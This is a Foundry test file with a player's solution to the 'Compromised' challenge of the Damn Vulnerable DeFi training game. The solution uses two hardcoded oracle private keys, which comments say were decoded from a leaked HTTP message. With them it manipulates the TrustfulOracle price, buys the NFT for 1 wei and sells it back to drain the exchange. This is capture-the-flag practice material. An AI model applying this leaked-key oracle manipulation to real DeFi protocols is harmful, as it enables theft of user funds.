// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    // I have the private key of the first address and the second one.
    // Took it from the output of the http mesg.
    // HEX --> ASCII, Base64 decode --> private key. 
    // Generate an address from this private key (https://iancoleman.net/ethereum-private-key-to-address/)
    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        //Intermediary intermediary = new Intermediary(exchange, recovery);
        
        // Derive the addresses from the private keys I got
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        assertEq(source1, sources[0]);
        assertEq(source2, sources[1]);

        vm.startBroadcast(privateKey1);
        // Change the prices of the NFT
        oracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey2);
        // Change the prices of the NFT
        oracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();

        // Buy NFT as a player for 0 ether
        vm.prank(player);
        uint256 nftId = exchange.buyOne{value: 1}();
        //uint256 nftId = intermediary.buy{value: 1}();

        vm.startBroadcast(privateKey1);
        // Change the prices of the NFT
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey2);
        // Change the prices of the NFT
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopBroadcast();

        // Sell NFT to rescue all the funds
        vm.startPrank(player);
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
        vm.stopPrank();
        //intermediary.sell(nftId);

        assertEq(player.balance, EXCHANGE_INITIAL_ETH_BALANCE + PLAYER_INITIAL_ETH_BALANCE);

        // Send the ether to the recovery account
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}



//contract Intermediary is IERC721Receiver {
//
//    Exchange exchange;
//    address recovery;
//    constructor(Exchange _exchange, address _recovery){
//        exchange = _exchange;
//        recovery = _recovery;
//    }
//
//    function buy() payable public returns (uint256 id) {
//        id = exchange.buyOne{value: msg.value}();
//    }
//
//    function sell(uint256 id) public {
//        exchange.sellOne(id);
//    }
//
//    function onERC721Received(
//        address operator,
//        address from,
//        uint256 tokenId,
//        bytes calldata data
//    ) external returns (bytes4) {
//
//    }
//
//    receive() external payable {}
//
//}
